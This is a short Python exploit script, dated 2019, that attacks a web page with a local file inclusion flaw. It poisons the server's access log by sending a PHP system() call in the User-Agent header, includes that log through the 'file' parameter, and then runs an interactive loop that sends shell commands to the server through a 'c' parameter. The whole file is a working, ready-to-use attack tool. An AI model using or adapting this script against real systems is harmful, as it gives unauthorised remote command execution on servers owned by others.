#!/usr/local/bin/python3.7

######################################
# Author: Amit Nizri                 #
# Date:   Aug, 2019                  #
######################################

import requests

##Globals
url = input('\nurl: ') #url of the vulnerable page. 
lfi_id ='file' #might be different

#adds http if the url has been given without the protocol.
if not url.startswith('h'):
    url ='http://'+url

try:
    res = requests.get(url)
    res.raise_for_status()

except requests.exceptions.HTTPError as e:
    print(e)
    exit(1)

except:
    print('[!]Bad url..')
    print('*\turl: %s' %(url)) 
    exit(1)

#Checks if can infer the location of the log file.
if 'Server' in res.headers.keys() and 'FreeBSD' in res.headers['Server']:
    log_page = '/var/log/httpd-access.log'
else:
    log_page = input('Log page: ')

url +='?file='+log_page
#injects the exploit's code.
headers = {'User-Agent':"<?php system($_GET['c']); ?>"}

try :
    res = requests.get(url,headers=headers)
except:
    print("[!] Something went wrong..")
    print("Attempted url: %s" %(url))
    res.close()
    exit(1)

if 'python' in res.text.split('"')[-2]:
    print("[*] Success!! you've got shell!\n")
else:
    print("[!] Something went wrong..")
    res.close()
    exit(1)

while True:
    com = input('Shell->$: ')
    try:
        res = requests.get(url+'&c='+com,headers=headers)
    except requests.exceptions.HTTPError as e:
        print(e)
        exit(1)

    except:
        print('[!] Something went wrong..')
        exit(1)

    print(res.text.split('"')[-2].strip())

res.close()





